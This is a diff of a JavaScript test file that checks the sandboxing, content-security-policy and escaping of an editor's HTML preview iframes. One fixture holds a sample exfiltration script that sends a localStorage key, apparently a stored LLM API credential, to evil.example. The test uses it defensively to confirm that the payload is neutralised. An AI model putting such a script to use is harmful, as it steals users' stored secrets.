@@ -424,7 +424,7 @@ module.exports = async function (t) {
   t.equal('applyFrame sets iframe csp before srcdoc', cspFrame.attrs.csp, win.Engine.Preview.iframeCsp);
   t.ok('applyFrame assigns srcdoc', cspFrame.srcdoc.indexOf('<script>x</script>') >= 0);
   const indexHtml = fs.readFileSync(path.join(__dirname, '..', 'dist', 'index.html'), 'utf8');
-  t.ok('Live Preview iframe markup includes csp connect-src none', /id="previewFrame"[^>]*csp="[^"]*connect-src 'none'"/.test(indexHtml) || /csp="[^"]*connect-src 'none'"[^>]*id="previewFrame"/.test(indexHtml));
+  t.ok('Live Preview iframe markup includes csp connect-src none', /id="previewFrame"[^>]*csp="[^"]*connect-src 'none'/.test(indexHtml) || /csp="[^"]*connect-src 'none'[^"]*"[^>]*id="previewFrame"/.test(indexHtml));
   t.ok('IDE preview iframes include csp', /data-idepreviewpanel[\s\S]{0,180}csp=/.test(appSrc) && /data-idepreview["\s][\s\S]{0,220}csp=/.test(appSrc));
   t.ok('preview loaders call applyFrame before srcdoc', /Preview\.applyFrame/.test(appSrc));
   win.Engine.FS.write('/index.html', RICH_HTML);
@@ -435,7 +435,7 @@ module.exports = async function (t) {
   const steal = '<html><body><script>location="https://evil.example/?k="+localStorage.getItem("cs.llm.v1")</script></body></html>';
   const shell = win.Engine.Preview.tabShell(steal);
   t.ok('preview tab shell sandboxes scripts without same-origin', /<iframe[^>]*sandbox="allow-scripts"/.test(shell) && !/allow-same-origin/.test(shell));
-  t.ok('preview tab shell iframe has csp connect-src none', /<iframe[^>]*csp="[^"]*connect-src 'none'"/.test(shell));
+  t.ok('preview tab shell iframe has csp connect-src none', /<iframe[^>]*csp="[^"]*connect-src 'none'/.test(shell));
   t.ok('preview tab shell does not allow top navigation', !/allow-top-navigation/.test(shell));
   t.ok('preview tab shell puts user HTML in srcdoc, not as the host document', /srcdoc="/.test(shell) && shell.indexOf('<iframe') < shell.indexOf('&lt;script&gt;'));
   t.ok('preview tab shell escapes user markup so it cannot break out of srcdoc', /&lt;script&gt;/.test(shell) && !/<script>location=/.test(shell));
